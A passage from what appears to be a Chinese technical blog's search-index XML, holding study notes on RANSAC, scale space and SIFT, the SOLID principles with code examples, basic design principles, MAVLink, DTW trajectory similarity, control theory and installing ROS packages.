    <content type="text"><![CDATA[随机抽样一致算法（RANdom SAmple Consensus，RANSAC）。它采用迭代的方式从一组包含离群(outlier)的被观测数据中估算出数学模型的参数。 RANSAC是一个非确定性算法，在某种意义上说，它会产生一个在一定概率下合理的结果，而更多次的迭代会使这一概率增加。此RANSAC算法在1981年由Fischler和Bolles首次提出。 RANSAC的基本假设是 “内群”(inlier)数据可以通过几组模型的参数来叙述其分布，而“离群”(outlier)数据则是不适合模型化的数据。 数据会受噪声影响，噪声指的是离群，例如从极端的噪声或错误解释有关数据的测量或不正确的假设。 RANSAC假定，给定一组（通常很小）的内群，存在一个程序，这个程序可以估算最佳解释或最适用于这一数据模型的参数。 范例这里用一个简单的例子来说明，在一组数据点中找到一条最适合的线。假设，此有一组集合包含了内群以及离群，其中内群为可以被拟合到线段上的点，而离群则是无法被拟合的点。如果我们用简单的最小二乘法来找此线，我们将无法得到一条适合于内群的线，因为最小二乘法会受离群影响而影响其结果。而RANSAC，可以只由内群来计算出模型，而且概率还够高。然而，RANSAC无法保证结果一定最好，所以必须小心选择参数，使其能有足够的概率。 包含许多离群的一组数据，要找一条最适合的线。 RANSAC找到的线，离群值对结果没影响（蓝色点为内群，红色点为离群） 设计RANSAC算法是一个学习的技巧，通过使用观测数据的随机样本来估计模型参数。RANSAC使用投票机制来寻找优化的拟合结果。每个数据元被用来投票一或多个模型。投票机制基于两点假设： 噪音大的特征并不能一直单独为某个模型投票 有足够多的特征来拟合一个好的模型 一般RANSAC算法由两步骤迭代计算： 一个样本子集，包含数据选取（随机选取）。通过使用这些数据得到一个拟合模型和相关的模型参数。样本子集的数量是最小充分的得到模型参数。 算法检查数据集中的哪些元素是一直在第一步估计到的模型当中的。如果在阈值（相对噪声的最大偏离度）外的话，该模型元素不能拟合估计到的模型便会被当做outlier。 inliers的设置称作“一致性设置”RANSAC算法会一直迭代直到获得足够的inliers。 RANSAC的输入是一些观测数据和一些“可信度”参数，实现步骤： 随机选择一些原始数据，叫作假设inliers子集 建立模型拟合 用其他数据来验证，根据模型特定的loss-function来计算是否符合该模型 如果足够的点都算是“一致性”设置里则该模型算是好模型 比较所有的“一致性”设置（就是建立的所有模型）看看哪个inliers多就是我们要的。 参数决定假设每个点是真正内群的几率是 $w$ : w = 真正內群的數目 / 數據總共的數量通常我们不知道 $w$ 是多少, $w^n$ 是所选择的n个点都是内群的几率, $1-w^n$ 是所选择的n个点至少有一个不是内群的几率, $(1 − w^n)^k$ 是表示重复k次都没有全部的n个点都是内群的几率, 这边定算法跑k次以后成功的几率是p，那么, 1 − p =(1 − w^n)^kp = 1 −(1 − w^n)^k所以如果希望成功几率高，p = 0.99, 当n不变时，k越大,p越大, 当w不变时，n越大，所需的k就越大, 通常w未知，所以n选小一点比较好。 应用RANSAC常被用在计算机视觉，例如，对应点问题和 估算立体摄影机双眼相对点的基本矩阵。 参考链接 随机抽样一致RANSAC: Random Sample Consensus,by 江知季. 随机抽样一致,by wikipedia.]]></content>
      <tags>
        <tag>计算机视觉</tag>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[尺度空间理论简介]]></title>
    <url>%2F2019%2F06%2F22%2F%E5%B0%BA%E5%BA%A6%E7%A9%BA%E9%97%B4%E7%90%86%E8%AE%BA%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[尺度空间理论最早可以追溯到1962年的T.Iijima最先提出，学术界开始关注尺度空间技术主要在1986年IEEE PAMI上同时刊出的4篇关于尺度空间理论的文章奠定了发展基础。 现实世界中物体只有具备一定的尺度才能够倍人眼所察觉，计算机视觉学术研究就是在不断的尝试与突破来模拟人眼的观察方法。因此，尺度空间就是试图在图像领域中模拟人眼观察物体的概念与方法。 尺度空间理论概述图像的尺度空间是指图像的模糊程度，而非图像的大小。近距离看一个物体和远距离看一个物体，模糊程度是不一样的；从近到远，图像越来越模糊的过程，也是图像的尺度越来越大的过程。 尺度空间的作用 用计算机视觉系统分析未知场景时，计算机并不预先知道图像中物体的尺度。需要同时考虑图像在多尺度下的描述，获知感兴趣物体的最佳尺度； 不同的尺度下都有同样的关键点，那么在不同的尺度的输入图像下就都可以检测出来关键点匹配，也就是尺度不变性； 尺度空间的应用 David G. Lowe教授基于描述数字图像局部特征的尺度空间概念，于1999年提出尺度不变特征变换算法（Scale-invariant feature transform，SIFT）； 在信息获取与处理、建筑、城市学等不同学科中，都有类似的概念，或有借用尺度空间的概念与方法的可能； 尺度不变特征转换尺度不变特征转换(Scale-invariant feature transform 或 SIFT)是一种机器视觉的算法用来侦测与描述影像中的局部性特征，它在空间尺度中寻找极值点，并提取出其位置、尺度、旋转不变数，此算法由 David Lowe 在1999年所发表，2004年完善总结。 [1] 后续的论文中也有许多基于 SIFT 改进的论文，例如 SURF 将 SIFT 的许多过程近似，达到加速的效果；PCA-SIFT利用主成分分析降低描述子的维度，减少内存的使用并加快配对速度。 其应用范围包含物体辨识、机器人地图感知与导航、影像缝合、3D模型建立、手势辨识、影像追踪和动作比对。 此算法有其专利，专利拥有者为 英属哥伦比亚大学。 参考链接 SIFT算法系列之尺度空间,by small_munich. 尺度不变特征转换,by wikipedia. 尺度空间理论,by ☆Ronny丶. 特征点检测一,by 张帅宾. ORB特征提取、匹配及实现,by zhaoxuhui. 图像特征描述子之BRIEF,by Senit_Co.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机图形学</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面向对象设计的五大原则SOLID]]></title>
    <url>%2F2019%2F06%2F16%2F%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%AE%BE%E8%AE%A1%E7%9A%84%E4%BA%94%E5%A4%A7%E5%8E%9F%E5%88%99SOLID%2F</url>
    <content type="text"><![CDATA[在程序设计领域， SOLID（单一功能、开闭原则、里氏替换、接口隔离以及依赖反转）是由罗伯特·C·马丁在21世纪早期引入，指代了面向对象编程和面向对象设计的五个基本原则。 当这些原则被一起应用时，它们使得一个程序员开发一个容易进行软件维护和扩展的系统变得更加可能。 SOLID所包含的原则是通过引发编程者进行软件源代码的代码重构进行软件的代码异味清扫，从而使得软件清晰可读以及可扩展时可以应用的指南。 SOLID被典型的应用在测试驱动开发上，并且是敏捷开发以及自适应软件开发的基本原则的重要组成部分。 SOLID原则简介 首字母 指代 概念 S 单一功能原则 对象应该仅具有一种单一功能 O 开闭原则 软件体应该是对于扩展开放的，但是对于修改封闭的 L 里氏替换原则 程序中对象在不改变程序正确性的前提下被它的子类所替换 I 接口隔离原则 多个特定客户端接口要好于一个宽泛用途的接口 D 依赖反转原则 依赖于抽象而不是一个实例 单一功能原则在面向对象编程领域中，单一功能原则（Single responsibility principle）规定每个类都应该有一个单一的功能，并且该功能应该由这个类完全封装起来。所有它的（这个类的）服务都应该严密的和该功能平行（功能平行，意味着没有依赖）。 这个术语由罗伯特·C·马丁（Robert Cecil Martin）在他的《敏捷软件开发，原则，模式和实践》一书中的一篇名为〈面向对象设计原则〉的文章中给出。 马丁表述该原则是基于的《结构化分析和系统规格》一书中的内聚原则（Cohesion）上。 马丁把功能（职责）定义为：“改变的原因”，并且总结出一个类或者模块应该有且只有一个改变的原因。一个具体的例子就是，想象有一个用于编辑和打印报表的模块。这样的一个模块存在两个改变的原因。第一，报表的内容可以改变（编辑）。第二，报表的格式可以改变（打印）。这两方面会的改变因为完全不同的起因而发生：一个是本质的修改，一个是表面的修改。单一功能原则认为这两方面的问题事实上是两个分离的功能，因此他们应该分离在不同的类或者模块里。把有不同的改变原因的事物耦合在一起的设计是糟糕的。 保持一个类专注于单一功能点上的一个重要的原因是，它会使得类更加的健壮。继续上面的例子，如果有一个对于报表编辑流程的修改，那么将存在极大的危险性，因为假设这两个功能存在于同一个类中，修改报表的编辑流程会导致公共状态或者依赖关系的改变，打印功能的代码会因此不工作。 示例： 1234567891011121314151617181920212223242526272829303132333435abstract class Employee &#123; // This needs to be implemented abstract calculatePay (): number; // This needs to be implemented abstract reportHours (): number; // let&apos;s assume THIS is going to be the // same algorithm for each employee- it can // be shared here. protected save (): Promise&lt;any&gt; &#123; // common save algorithm &#125;&#125;class HR extends Employee &#123; calculatePay (): number &#123; // implement own algorithm &#125; reportHours (): number &#123; // implement own algorithm &#125;&#125;class Accounting extends Employee &#123; calculatePay (): number &#123; // implement own algorithm &#125; reportHours (): number &#123; // implement own algorithm &#125;&#125;class IT extends Employee &#123; ...&#125; 开闭原则在面向对象编程领域中，开闭原则规定“软件中的对象（类，模块，函数等等）应该对于扩展是开放的，但是对于修改是封闭的”，这意味着一个实体是允许在不改变它的源代码的前提下变更它的行为。该特性在产品化的环境中是特别有价值的，在这种环境中，改变源代码需要代码审查，单元测试以及诸如此类的用以确保产品使用质量的过程。遵循这种原则的代码在扩展时并不发生改变，因此无需上述的过程。 开闭原则的命名被应用在两种方式上。这两种方式都使用了继承来解决明显的困境，但是它们的目的，技术以及结果是不同的。 图2 开闭原则示意图 里氏替换原则在面向对象的程序设计中，里氏替换原则（Liskov Substitution principle）是对子类型的特别定义。它由芭芭拉·利斯科夫（Barbara Liskov）在1987年在一次会议上名为“数据的抽象与层次”的演说中首先提出。 里氏替换原则的内容可以描述为： “派生类（子类）对象可以在程式中代替其基类（超类）对象。” 接口隔离原则接口隔离原则（英语：interface-segregation principles， 缩写：ISP）指明客户（client）应该不依赖于它不使用的方法。接口隔离原则(ISP)拆分非常庞大臃肿的接口成为更小的和更具体的接口，这样客户将会只需要知道他们感兴趣的方法。这种缩小的接口也被称为角色接口（role interfaces）。接口隔离原则(ISP)的目的是系统解开耦合，从而容易重构，更改和重新部署。 举例以商家接入移动支付API的场景举例，支付宝支持收费和退费；微信接口只支持收费。 123456789101112131415161718192021222324interface PayChannel &#123; void charge(); void refund();&#125;class AlipayChannel implements PayChannel &#123; public void charge() &#123; ... &#125; public void refund() &#123; ... &#125;&#125;class WeChatChannel implements payChannel &#123; public void charge() &#123; ... &#125; public void refund() &#123; // 没有任何代码 &#125;&#125; 第二种支付渠道，根本没有退款的功能，但是由于实现了PayChannel，又不得不将refund()实现成了空方法。那么，在调用中，这个方法是可以调用的，实际上什么都没有做! 将PayChannel拆成各包含一个方法的两个接口PayableChannel和RefundableChannel。 依赖反转原则在面向对象编程领域中，依赖反转原则（Dependency inversion principle，DIP）是指一种特定的解耦（传统的依赖关系创建在高层次上，而具体的策略设置则应用在低层次的模块上）形式，使得高层次的模块不依赖于低层次的模块的实现细节，依赖关系被颠倒（反转），从而使得低层次模块依赖于高层次模块的需求抽象。 该原则规定： 高层次的模块不应该依赖于低层次的模块，两者都应该依赖于抽象接口。 抽象接口不应该依赖于具体实现。而具体实现则应该依赖于抽象接口。 该原则颠倒了一部分人对于面向对象设计的认识方式。如高层次和低层次对象都应该依赖于相同的抽象接口。 左图中高层对象A依赖于底层对象B的实现；右图中把高层对象A对底层对象的需求抽象为一个接口A，底层对象B实现了接口A，这就是依赖反转。 图2 依赖反转原则示意图 在传统的应用架构中，低层次的组件设计用于被高层次的组件使用，这一点提供了逐步的构建一个复杂系统的可能。在这种结构下，高层次的组件直接依赖于低层次的组件去实现一些任务。这种对于低层次组件的依赖限制了高层次组件被重用的可行性。 依赖反转原则的目的是把高层次组件从对低层次组件的依赖中解耦出来，这样使得重用不同层级的组件实现变得可能。把高层组件和低层组件划分到不同的包/库（在这些包/库中拥有定义了高层组件所必须的行为和服务的接口，并且存在高层组件的包）中的方式促进了这种解耦。由于低层组件是对高层组件接口的具体实现，因此低层组件包的编译是依赖于高层组件的，这颠倒了传统的依赖关系。众多的设计模式，比如插件，服务定位器或者依赖反转，则被用来在运行时把指定的低层组件实现提供给高层组件。 应用依赖反转原则同样被认为是应用了适配器模式，例如：高层的类定义了它自己的适配器接口（高层类所依赖的抽象接口）。被适配的对象同样依赖于适配器接口的抽象（这是当然的，因为它实现了这个接口），同时它的实现则可以使用它自身所在低层模块的代码。通过这种方式，高层组件则不依赖于低层组件，因为它（高层组件）仅间接的通过调用适配器接口多态方法使用了低层组件，而这些多态方法则是由被适配对象以及它的低层模块所实现的。 举例1234567class PasswordReminder &#123; private $dbConnection; public function __construct(MySQLConnection $dbConnection) &#123; $this-&gt;dbConnection = $dbConnection; &#125;&#125; 上述代码存在问题：首先MySQLConnection是低层次模块，而PasswordReminder处于高层次，但根据S.O.L.I.D.中D的定义，即依赖抽象而不是具体实现，上面这段代码违反这一原则，PasswordReminder类被迫依赖于MySQLConnection类。 以后如果你改变数据库引擎，你还必须编辑PasswordReminder类，因此违反了开闭原则。 PasswordReminder类不应该关心你的应用程序使用什么数据库，为了解决这个问题我们又一次“对接口编程”，因为高层次和低层次模块应该依赖于抽象，我们可以创建一个接口: 123interface DBConnectionInterface &#123; public function connect();&#125; 接口有一个connect方法，MySQLConnection类实现该接口，在PasswordReminder类的构造函数不使用MySQLConnection类，而是使用接口替换，不用管你的应用程序使用的是什么类型的数据库，PasswordReminder类可以很容易地连接到数据库，没有任何问题，且不违反OCP。 12345678910111213class MySQLConnection implements DBConnectionInterface &#123; public function connect() &#123; return &quot;Database connection&quot;; &#125;&#125; class PasswordReminder &#123; private $dbConnection; public function __construct(DBConnectionInterface $dbConnection) &#123; $this-&gt;dbConnection = $dbConnection; &#125;&#125; 根据上面的代码片段，你现在可以看到，高层次和低层次模块依赖于抽象。 参考链接 面向对象的SOLID原则,by wuyuegb2312. SOLID (面向对象设计)),by wikipedia. SOLID Principles: The Software Developer’s Framework to Robust &amp; Maintainable Code [with Examples],by Khalil Stemmler. S.O.L.I.D：面向对象设计的头 5 大原则,by 伯乐在线.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[非专业设计师的基本设计原则]]></title>
    <url>%2F2019%2F06%2F14%2F%E9%9D%9E%E4%B8%93%E4%B8%9A%E8%AE%BE%E8%AE%A1%E5%B8%88%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99%2F</url>
    <content type="text"><![CDATA[绝大部分内容创作者不是专业的设计师，因此在其内容展示时会遇到很大的困难，即如何对展示的内容进行优雅的排版？ 遵循如下四个原则，虽然不会让您创造出令人惊艳的设计，但能帮助您创建出色、清晰且易于理解的设计，使每个人都可以轻松理解和互动。 对比确保所有元素之间有足够的对比度。您的设计元素应该完全相同或显着不同。 对比问题主要表现在4种不同的方面： 颜色：浅色使用深色，反之亦然。 尺寸：仅将彼此相邻的元素放在完全相同的大小或相当大的大小上。 重量：与尺寸相同，只是将元素放在彼此相邻的重量完全相同或重量相当不同的地方。 样式：不要将一个斜体类型放在另一个斜体类型旁边，或者在另一个衬线字体旁边放置一个衬线字体。 结合不同的东西。 一致性确保类似的元素以类似的方式出现。 为什么？ 首先，通过保持事物的一致性（因此，简单），您可以让人们将注意力集中在设计的重要方面，而不是被一直在变化的事物分散注意力。 其次，一致性增加了信任，使事物看起来实际上是设计的，而不是简单地快速抛在一起。 一旦你选择它们就要坚持下去： 字体/字体 调色板/颜色的阴影 表格 对齐 装饰元素的风格 奥卡姆剃刀奥卡姆剃刀即若无必要，勿增实体，以减少视觉噪音。 您在设计中使用的元素数量越少越好。 为什么？ 人类的大脑很难处理信息并在输入过载的情况下做出决策。 使用尽可能少的装饰元素（字体，颜色，阴影，框架，笔画，图标，图案等）。 将奥卡姆剃刀的设计原则应用于所有内容： 如果只用2个元素可以实现某些功能，请不要使用3.如果可以使用10个元素实现某些功能，请不要使用20.您可以使用它。 空间事物的定位方式会发送关于其含义的元级别消息。 为什么这很重要？ 因为了解你如何定位事物以及你在它们周围添加了多少空间有助于降低设计的复杂性，因此，使它更令人愉悦，更容易与之交互。 在设计中使用空间来传达这三个方面的意义： 接近==相关性 与其他元素相比彼此更接近的事物被认为彼此更多地相互关联而不是与其他元素相关。 这个是最重要的，因为我觉得它经常被忽视（甚至有些人声称是专业设计师，而不是命名任何名字）。 它可以以多种不同的方式应用，例如： * 行之间应该有一个空格，而不是一行中每个单词之间的空间 - 同样，不同段落之间的空间也比段落内的行之间的空间要大。 * 设计元素应该在彼此之间具有较小的空间，而不是在这些元素和组合物的边缘之间。 * 标签和支持信息应位于其描述/相关的元素附近。 负空间 与奥卡姆剃刀设计原则结合使用，尽可能地为您的设计提供负面空间，使它们整齐并使其意义更加明显。 将太多元素放入有限的空间就像试着一次听三首不同的歌。 很难理解所说的内容。 重要性和秩序 最重要的事情，你先放，和/或让它们占用最多的空间。 使用一系列事物来传达秩序。 等等。你绝对可以弄明白其余的。 参考链接 Fundamental design principles for non-designers,by freecodecamp. 奥卡姆剃刀,by wikipedia.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MAVLink协议解析]]></title>
    <url>%2F2019%2F06%2F13%2FMavlink%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[MAVLink是一种非常轻量级的消息传递协议，用于与无人机（以及板载无人机组件之间）进行通信。 MAVLink遵循现代混合发布-订阅和点对点设计模式：数据流作为主题发送/发布，而配置子协议（如任务协议或参数协议）是点对点重传。 消息在XML文件中定义。每个XML文件定义特定MAVLink系统支持的消息集，也称为“方言”。由大多数地面控制站和自动驾驶仪实现的参考消息集在common.xml中定义（大多数方言构建在此定义的顶部）。 MAVLink工具链使用XML消息定义为每种受支持的编程语言生成MAVLink库。无人机，地面控制站和其他MAVLink系统使用生成的库进行通信。这些通常是MIT许可的，因此可以在任何闭源应用程序中无限制地使用，而无需发布闭源应用程序的源代码。 MAVLink于2009年初由Lorenz Meier首次发布，现在已经有相当数量的贡献者。 MAVLink消息格式MAVLink消息格式如图1所示。 图1 MAVLink消息格式 MAVLink消息中各字段含义如图2所示。 图2 MAVLink消息格式描述 参考链接 MAVLink Developer Guide,by mavlink homepage. 无人机通讯协议 —Mavlink 学习, by Theshy. Pixhawk原生固件PX4之MAVLink协议解析,by FantasyJXF.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>无人机</tag>
        <tag>MAVLink</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[轨迹相似度度量方法总结]]></title>
    <url>%2F2019%2F06%2F10%2F%E8%BD%A8%E8%BF%B9%E7%9B%B8%E4%BC%BC%E5%BA%A6%E5%BA%A6%E9%87%8F%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[轨迹相似度度量有广泛的用途，如语音识别分类、模板匹配、信息检索等。下面介绍各种轨迹相似度度量方法。 轨迹定义轨迹可由时间域到空间域的映射函数表示，如： t\stackrel{F}{\longrightarrow}R^d, d>1度量方法轨迹相似度度量方法主要有： 基于点方法： EDR，LCSS，DTW等 基于形状的方法： Frechet， Hausdorff 基于分段的方法：One Way Distance, LIP distance 基于特定任务的方法：TRACLUS， Road Network，grid等 基于点的方法DTWDTW（Dynamic Time Warping, 动态时间规整）可以计算两个时间序列的相似度，尤其适用于不同长度、不同节奏的时间序列（比如不同的人读同一个词的音频序列）。DTW将自动warping扭曲 时间序列（即在时间轴上进行局部的缩放），使得两个序列的形态尽可能的一致，得到最大可能的相似度。 Dynamic Time Warping（DTW）诞生有一定的历史了（日本学者Itakura提出），它出现的目的也比较单纯，是一种衡量两个长度不同的时间序列的相似度的方法。应用也比较广，主要是在模板匹配中，比如说用在孤立词语音识别（识别两段语音是否表示同一个单词），手势识别，数据挖掘和信息检索等中。 设 $P=$ 和 $Q=$ 是两个时间序列，则 $P$ 和 $Q$的距离 $DTW(P,Q)$ 定义如下： DTW(P,Q)= \left\{ \begin{array}{lcl} 0 & &if\ m=n=0\\ \infty & &if\ m=0\ or\ n=0\\ dist(p_1,q_1)+min \left\{ \begin{aligned} DTW(Rest(P),Rest(Q))\\ DTW(Rest(P),Q)\\ DTW(P,Rest(Q))\\ \end{aligned} \right\} & & otherwise \end{array} \right.参考链接 如何判断两条轨迹（或曲线）的相似度？,by zhihu. 动态时间规整（DTW）算法简介,by 文均. DTW(Dynamic Time Warping)动态时间规整,by X-猪. Dynamic Time Warping 动态时间规整算法,by 阿凡卢.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[经典控制与现代控制理论的区别与联系]]></title>
    <url>%2F2019%2F06%2F09%2F%E7%BB%8F%E5%85%B8%E6%8E%A7%E5%88%B6%E4%B8%8E%E7%8E%B0%E4%BB%A3%E6%8E%A7%E5%88%B6%E7%90%86%E8%AE%BA%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB%2F</url>
    <content type="text"><![CDATA[控制理论是工程学与数学的跨领域分支，主要处理在有输入信号的动力系统的行为。系统的外部输入称为“参考值”，系统中的一个或多个变量需随着参考值变化，控制器处理系统的输入，使系统输出得到预期的效果。 控制理论一般的目的是借由控制器的动作让系统稳定，也就是系统维持在设定值，而且不会在设定值附近晃动。 控制论简介控制理论是 一个研究如何调整动态系统特性的理论。 科学中跨学科的领域，起源于工程及数学，逐渐的应用在许多社会科学中，例如心理学、社会学（社会学中的控制理论）、犯罪学及金融系统。 控制系统可以视为具有四种机能的系统：量测、比较、计算及修正。这四个机能可以用五种元素来实现：感测器、换能器、发送器、控制器及最终控制元件。量测机能是由感测器、换能器及发送器执行，在实务应用上，这三个元素会整合在一个单体内，像是电阻温度计。比较和计算的机能是由控制器执行，可能是电子式的比例控制（P控制）、PI控制、PID控制、双稳态的迟滞控制，也可能是可编程逻辑控制器（PLC）。早期的控制器也可能是机械式的，像是离心式调速器或是化油器。修正机能是由最终控制元件执行，最终控制元件改变系统的输出，因此影响操纵或控制的变量。 范例车辆的巡航定速系统是让车辆维持在由驾驶者设定的固定参考速度。此时控制器为巡航定速系统，车辆为受控体（plant），而系统是由控制器和车辆所组成，而控制变量是引擎节流阀的位置．会决定引擎可以产生的功率。 一种最单纯的作法是当驾驶者启动巡航定速系统时，固定引擎节流阀的位置。但是若驾驶者在平坦的路面启动巡航定速系统，车辆在上坡时速度会较慢，车辆在下坡时速度又会较快。这种的控制器称为开环控制器，因为没有去量测系统输出（车辆速度）并且影响控制变量（节流阀位置），因此此系统无法去针对车辆遇到的变化（像路面坡度的变动）去进行调整。 在闭环控制系统中，利用感测器量测系统输出（车辆速度），并将资料送入控制器中，控制器依资料调整控制变量（节流阀位置），来达到维持理想系统输出（使车辆速度和驾驶者设定的参考速度一致）。此时若车辆在上坡时，感测器会量到车辆的速度变慢，因此会调整节流阀位置，加大引擎输出功率，使马达加速。因为有量测车辆速度的回授，因此控制器可以配合车辆速度的变化进行动态调整。因此产生了控制系统中的“环”范式：控制变量影响系统输出，而再根据量测到的系统输出去调整控制变量。 经典控制理论为了克服开环控制器的限制，在控制理论中导入了反馈。闭环的控制器利用回授来控制动态系统的状态或输出。其名称来自系统中的讯息路径：程序输入（例如马达的电压）影响程序输出（例如马达的电流或转矩），利用感测器量测输出，再将量测资料送到控制器中处理，结果送回控制器作为输入信号之一，因此成为一闭环。 相对于开环控制器，闭环控制器有以下的优点： 噪声抑制能力（像巡航定速中的路面坡度）。 即使在数学模型有一些不确定性的情形下（如模型结构和实际系统不是完全符合，或是模型参数和实际数值不是完全一致），仍有一定程度的性能。 可以稳定不稳定的系统 减少对于参数变动的灵敏度 提升命令追随（命令变化时，系统配合命令变化）的性能 有些系统中，同时出现开环及闭环的控制，此时的开环会称为前馈，目的是为了提升命令追随的性能。 PID控制器是常见的闭回路控制器架构。 闭环传递函数系统的输出y(t)借由感测器F量测后，和参考值r(t)相减，控制器C根据参考值和输出值的误差e调整受控体P的输入u，如图1所示，这类的控制器称为闭环控制器。 由于只有一个输入和输出，此系统会称为SISO（单一输入单一输出）控制系统。MIMO（多重输入多重输出）控制系统是指输入或输出不只一个，在实际应用上也很常见，其输入变量和输出变量会用向量表示，而不是单一数值的标量。在分布参量系统中，向量可能是无限维的，即一般的函数。 图1 闭环传递函数示意图 若假设控制器C、受控体P及感测器F都是线性及非时变的（各模组输入和输出的关系不随时间改变），可以将上述系统用拉普拉斯转换来分析，因此可以得到以下的关系： Y(s)=P(s)U(s)\,\!U(s)=C(s)E(s)\,\!E(s)=R(s)-F(s)Y(s)\,\!其中 s为拉普拉斯转换中的复变量，若要求解Y(s)用R(s)表示，可得： Y(s)=\left({\frac {P(s)C(s)}{1+F(s)P(s)C(s)}}\right)R(s)=H(s)R(s)\,\!表示式 $H(s)={\frac {P(s)C(s)}{1+F(s)P(s)C(s)}}\,!$即为系统的闭环传递函数，分子是从r到y的前馈（开环）增益，分母是1加上经过反馈环的增益．即闭环增益，若$|P(s)C(s)|\gg 1\,!$，，也就是说在各s下，其范数都很大，且 $|F(s)|\approx 1\,!$，则Y(s)近似于R(s)，此时输出会紧密的追随参考输入。 PID请参考链接[4]。 现代控制理论经典控制理论以频域分析为主，而现代控制理论利用时域的状态空间表示法，将系统中的输入、输出及状态变量之间的关系用一阶的微分方程表示。为了抽象化输入、输出及状态变量的数量，这些变量一般会用向量来表示，而微分方程或代数方程（当系统是线性时）则会以矩阵形式表示。状态空间表示法也称为时域分析，提供一个方便且简洁的方式针对多重输入及输出的系统建模及分析，在有输入和输出时，也可以利用拉氏转换，将系统所有的资料包括在其中。现代控制理论不同于频域分析，可以分析非线性或不是零初始条件的系统。状态空间就是指坐标轴为状态变量的空间，系统的状态可以表示为状态空间中的一个向量。 控制理论主题稳定性在控制理论中的稳定性是指控制系统的状态在特定条件下，可以维持在一定的范围内，不会发散，而在什么范围内才算是稳定则依系统种类而不同。 没有输入信号的动力系统，其稳定性是用李雅普诺夫稳定性来描述，也就是任何初始条件在 $x{0}$ 附近的轨迹均能维持在 $x{0}$ 附近 有输入信号的线性系统，其稳定性是用有界输入有界输出稳定性（BIBO 稳定性）来描述，针对任何有界的输入信号，其输出也是有界。 有输入信号的非线性系统，其稳定性是用输入-状态稳定性（input-to-state stability），结合了李雅普诺夫稳定性及类似有界输入有界输出稳定性的表示方式。 可控制性及可观测性可控制性和可观测性分别是输入和状态，输出和状态之间的性质。是在分析控制系统，决定控制策略或判断是否可以使系统稳定时所需要的重要性质。 可控制性是指是可以用适当的控制信号作为输入，使特定状态变量的数值变成０，和利用输入调整状态变量的能力有关，若一个状态变量是不可控制的，表示没有输入可以调整这一个状态，若一系统中所有不可控制的状态变量，其动态特性都是稳定的，则此系统称为可稳定的（stabilizable）。 可观测性是指可以用输出的量测及计算得到状态变量的值，若一个状态变量是不可观测的，表示无法确认此一状态是否稳定，也就无法用此状态来稳定整个系统。若一系统中所有不可控制的观测变量都是稳定的，则此系统称为可检测的（detectable）。 控制规格在控制原理的基础下，已发展出许多不同的控制策略，从非常通用的（PID控制器），到针对特殊系统的控制，尤其是机器人或是航空器的巡航定速控制。 一个控制问题会有许多的规格，其中稳定性是必要条件的，不论系统开环稳定性如何，控制器需确保在闭环下是稳定的。性能不佳或是调整不当的控制器可能使系统变的不稳定，甚至可能比开环还要不稳定，这是应尽量要避免的。 模型识别及鲁棒性控制系统一定会有一定程度的鲁棒性。控制器一般是依照一个假设的受控系统模组再进行设计，鲁棒性是指一控制器配合的受控系统和原来假设的系统有一点不同，控制器的特性不会有太大的变化。这个规格在实际的控制器中相当重要，因为很少实际系统会完全符合描述它的微分方程，在选择系统数学模型时，一般会进行简化，否则数学模型会非常复杂，甚至无法求得一个完整的模型。 系统分类线性系统控制针对MIMO的系统，极点的指定可以用开环系统的状态空间，再将极点放在指定位置，计算对应的回授矩阵。若在复杂的系统中，上述的程序需要用电脑辅助计算才能达到，而且不保证其鲁棒性。而且一般而言无法量到所有的系统状态，在极点指定的设计时需加入观测器（observer）的设计。 非线性系统控制像机器人学及航天产业中的程序一般都有高度非线性的动态，在控制理论中有时可以用线性化的方式转换为线性系统，再依线性系统的方式控制。但有时需要用一些可以配合非线性系统使用的非线性控制理论，例如回授线性化、反推控制、滑动模式控制等。轨迹线性化控制一般利用李亚普诺夫稳定性的基础。微分几何用做为一数学工具，将许多广为人知的线性控制概念扩展到非线性控制中，但其中又有其微妙之处，因此变成一个更有挑战性的问题。 分散式系统分散控制系统是指一个系统由多个控制器来控制。分散控制有几个好处，例如可以控制一个位在广大地理区域的系统，各控制器之间可以用通讯网络彼此交换资料，并协调彼此的行动。 参考链接 控制理论,by wikipedia. 「珂学原理」精选：经典控制和现代控制理论有何本质区别？,by 王珂. 拉普拉斯变换,by wikipedia. PID控制算法原理分析,by jackhuang.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>控制理论</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ROS中Package安装方法]]></title>
    <url>%2F2019%2F06%2F08%2FROS%E4%B8%ADPackage%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[ROS（机器人操作系统，Robot Operating System），是专为机器人软件开发所设计出来的一套电脑操作系统架构。它是一个开源的元级操作系统（后操作系统），提供类似于操作系统的服务，包括硬件抽象描述、底层驱动程序管理、共用功能的执行、程序间消息传递、程序发行包管理，它也提供一些工具和库用于获取、建立、编写和执行多机融合的程序。 ROS的Package资源非常丰富，官方库中就有两千多Package，这对扩充ROS的功能十分重要。下面即介绍ROS中Package的安装方法，主要分成两种方法： Deb安装方式deb方式安装方法十分简单，根据ROS版本，直接运行apt-get命令，例如： 1$ sudo apt-get install ros-kinetic-camera-calibration 源码安装方式源码安装方式稍微复杂，安装方法如下： 创建catkin工作空间 在catkin工作空间的src文件夹下，下载ROS的Package源代码 使用catkin build命令编译安装 参考链接 安装ROS软件包,by ferstar.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>ROS</tag>
